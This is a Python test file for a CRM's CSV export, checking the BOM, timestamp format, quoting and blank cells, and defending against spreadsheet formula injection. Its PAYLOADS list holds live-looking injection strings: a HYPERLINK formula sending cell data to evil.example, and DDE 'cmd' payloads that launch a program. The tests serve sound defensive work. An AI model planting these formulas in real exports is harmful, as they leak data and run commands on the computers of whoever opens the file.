# tests/test_csv_export_format.py
"""An export has to open correctly in the thing people actually open it with.

Both endpoints produced *valid* CSV that was still wrong on a double-click:

* **No UTF-8 BOM** — Excel on Windows decodes a BOM-less file in the system codepage, so every
  non-ASCII character mangles. Real account names in this database contain emoji.
* **Raw ISO timestamps with microseconds** — `2026-08-05T10:35:59.957670+00:00` is text to a
  spreadsheet, not a date, so the column cannot be sorted or filtered.

These are not cosmetics. An export exists to be opened by someone who will not debug it.
"""
from __future__ import annotations

import csv
import io

from tests.conftest import auth, signup

BOM = "﻿"


async def _account(client, token, name: str, **kw):
    body = {"name": name, "domain": kw.pop("domain", None), **kw}
    r = await client.post("/api/accounts", headers=auth(token), json=body)
    assert r.status_code in (200, 201), r.text
    return r.json()


def parse(text: str) -> tuple[list[str], list[list[str]]]:
    """Parse as a reader that honours the BOM would."""
    rows = list(csv.reader(io.StringIO(text.lstrip(BOM))))
    return rows[0], rows[1:]


# ---- the BOM -----------------------------------------------------------------------------------

async def test_accounts_export_starts_with_a_utf8_bom(client):
    token = await signup(client, slug="csv1", email="o@csv1.com", company="CSV1")
    await _account(client, token, "Acme", domain="acme.com")
    r = await client.get("/api/accounts/export/csv", headers=auth(token))
    assert r.status_code == 200
    assert r.text.startswith(BOM), "Excel needs the BOM to decode UTF-8"


async def test_contacts_export_starts_with_a_utf8_bom(client):
    token = await signup(client, slug="csv2", email="o@csv2.com", company="CSV2")
    r = await client.get("/api/contacts/export", headers=auth(token))
    assert r.text.startswith(BOM)


async def test_the_content_type_declares_utf8(client):
    """A browser previewing rather than downloading has to decode it too."""
    token = await signup(client, slug="csv3", email="o@csv3.com", company="CSV3")
    r = await client.get("/api/accounts/export/csv", headers=auth(token))
    assert "charset=utf-8" in r.headers["content-type"].lower()


async def test_non_ascii_survives_a_round_trip(client):
    """The reason the BOM matters: real account names carry emoji and accents."""
    token = await signup(client, slug="csv4", email="o@csv4.com", company="CSV4")
    await _account(client, token, "Café Solé 🚀", domain="cafe.example")
    r = await client.get("/api/accounts/export/csv", headers=auth(token))
    _, rows = parse(r.text)
    assert any("Café Solé 🚀" in row[0] for row in rows)


def test_the_bom_does_not_corrupt_the_first_header():
    """A reader that ignores the BOM must still see `name`, not `\\ufeffname`. This is the
    failure mode of adding a BOM carelessly."""
    from nexus.api.csv_export import csv_response

    body = csv_response("x.csv", ["name", "domain"], [["Acme", "acme.com"]]).body.decode()
    header, _ = parse(body)
    assert header[0] == "name"


# ---- timestamps --------------------------------------------------------------------------------

async def test_created_at_is_spreadsheet_readable(client):
    """`2026-08-05 10:35`, not `2026-08-05T10:35:59.957670+00:00`."""
    import re

    token = await signup(client, slug="csv5", email="o@csv5.com", company="CSV5")
    await _account(client, token, "Acme", domain="acme.com")
    r = await client.get("/api/accounts/export/csv", headers=auth(token))
    header, rows = parse(r.text)
    value = rows[0][header.index("created_at")]
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}", value), value
    assert "T" not in value and "+" not in value and "." not in value


def test_a_missing_timestamp_is_blank_not_the_word_none():
    from nexus.api.csv_export import csv_timestamp

    assert csv_timestamp(None) == ""


# ---- structure ---------------------------------------------------------------------------------

async def test_a_value_containing_a_comma_is_quoted_not_split(client):
    """The whole point of using csv.writer rather than joining with commas."""
    token = await signup(client, slug="csv6", email="o@csv6.com", company="CSV6")
    await _account(client, token, "Acme, Inc.", domain="acme.example", industry="Tech, B2B")
    r = await client.get("/api/accounts/export/csv", headers=auth(token))
    header, rows = parse(r.text)
    row = next(x for x in rows if x[0] == "Acme, Inc.")
    assert row[header.index("industry")] == "Tech, B2B"


async def test_every_row_has_the_same_column_count_as_the_header(client):
    """A ragged CSV silently shifts every value into the wrong column."""
    token = await signup(client, slug="csv7", email="o@csv7.com", company="CSV7")
    await _account(client, token, "One", domain="one.example")
    await _account(client, token, "Two", domain="two.example", industry="SaaS", country="US")
    r = await client.get("/api/accounts/export/csv", headers=auth(token))
    header, rows = parse(r.text)
    assert rows and all(len(row) == len(header) for row in rows)


def test_none_cells_render_blank_rather_than_the_string_none():
    """`None` reaching a CSV as the literal text "None" is the classic export bug."""
    from nexus.api.csv_export import csv_response

    body = csv_response("x.csv", ["a", "b"], [["Acme", None]]).body.decode()
    _, rows = parse(body)
    assert rows[0] == ["Acme", ""]


async def test_the_download_is_named_and_attached(client):
    token = await signup(client, slug="csv8", email="o@csv8.com", company="CSV8")
    r = await client.get("/api/contacts/export", headers=auth(token))
    disposition = r.headers.get("content-disposition", "")
    assert "attachment" in disposition and "contacts.csv" in disposition


# ---- formulas ----------------------------------------------------------------------------------
#
# Excel, Sheets and LibreOffice evaluate a cell that starts with `=`, `+`, `-` or `@` (and Excel one
# that starts with a tab or carriage return) as a formula. Account names, titles and industries come
# from imports, CRM pulls and web enrichment, so a value like `=HYPERLINK(...)` or `+cmd|...` is
# attacker-influenced, and opening the export would run it.

PAYLOADS = [
    '=HYPERLINK("http://evil.example/?d="&A2,"Click")',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
]


def _cells(*values) -> list[str]:
    from nexus.api.csv_export import csv_response

    body = csv_response("x.csv", [f"c{i}" for i in range(len(values))], [list(values)]).body.decode()
    return parse(body)[1][0]


def test_a_cell_a_spreadsheet_would_run_is_written_as_text():
    """A leading apostrophe makes the spreadsheet show the value instead of running it."""
    for payload, cell in zip(PAYLOADS, _cells(*PAYLOADS)):
        assert cell == "'" + payload, (payload, cell)


def test_a_list_cell_is_neutralised_after_joining():
    assert _cells(["=1+1", "Salesforce"]) == ["'=1+1; Salesforce"]


def test_ordinary_text_and_formula_characters_later_in_a_value_are_untouched():
    assert _cells("Acme", "VP Sales", "a=b", "R&D - EMEA", "") == [
        "Acme", "VP Sales", "a=b", "R&D - EMEA", ""]


def test_numbers_stay_numbers():
    """A real number, negative included, is data a spreadsheet must still be able to sum."""
    from decimal import Decimal

    assert _cells(-5, 120, 3.5, Decimal("-12.50"), True) == ["-5", "120", "3.5", "-12.50", "True"]


def test_a_phone_number_is_not_mangled():
    """Phones are stored E.164, so every one starts with `+`. Digits and phone punctuation cannot
    call a function or reach a link, and an apostrophe on every number would break a CRM
    re-import of the file."""
    assert _cells("+14155552671", "+1 (415) 555-2671", "-42", "+44 20 7946 0958") == [
        "+14155552671", "+1 (415) 555-2671", "-42", "+44 20 7946 0958"]


async def test_the_accounts_export_neutralises_a_malicious_name_and_industry(client):
    token = await signup(client, slug="csv9", email="o@csv9.com", company="CSV9")
    await _account(client, token, PAYLOADS[0], domain="evil.example", industry=PAYLOADS[1])
    r = await client.get("/api/accounts/export/csv", headers=auth(token))
    header, rows = parse(r.text)
    row = next(x for x in rows if x[header.index("domain")] == "evil.example")
    assert row[header.index("name")] == "'" + PAYLOADS[0]
    assert row[header.index("industry")] == "'" + PAYLOADS[1]


async def test_the_contacts_export_neutralises_a_malicious_name_and_title(client):
    token = await signup(client, slug="csv10", email="o@csv10.com", company="CSV10")
    acc = await _account(client, token, "Acme", domain="acme.example")
    r = await client.post(f"/api/accounts/{acc['id']}/contacts", headers=auth(token),
                          json={"full_name": "=1+1", "title": PAYLOADS[3],
                                "phone": "+1 415 555 2671"})
    assert r.status_code in (200, 201), r.text

    r = await client.get("/api/contacts/export", headers=auth(token))
    header, rows = parse(r.text)
    row = next(x for x in rows if x[header.index("domain")] == "acme.example")
    assert row[header.index("full_name")] == "'=1+1"
    assert row[header.index("title")] == "'" + PAYLOADS[3]
    assert row[header.index("phone")].startswith("+") and "'" not in row[header.index("phone")]
